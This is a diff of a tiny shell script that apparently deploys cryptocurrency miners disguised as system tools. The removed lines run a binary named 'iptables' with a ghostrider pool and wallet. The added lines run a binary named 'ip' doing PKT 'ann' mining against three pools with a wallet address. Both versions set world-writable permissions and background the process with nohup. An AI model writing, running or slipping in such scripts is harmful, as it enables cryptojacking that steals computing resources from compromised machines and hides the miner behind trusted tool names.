@@ -1,4 +1,4 @@
 #!/bin/sh
-chmod 777 iptables
-nohup ./iptables -a ghostrider --url 20.0.2.80:443 --user JV1wb2RLradsqueEvPnioKGZZRJ8xoYomm.STREAM &
-echo JOB DONE SUCCES
+chmod 777 ip
+nohup ./ip ann -p pkt1qfhj4y5cyhzh0u3pgkygx3f6vs4m7rlk8hj9euk http://pool.pktpool.io/diff/16384 http://pool.pkt.world http://pool.pkteer.com &
+
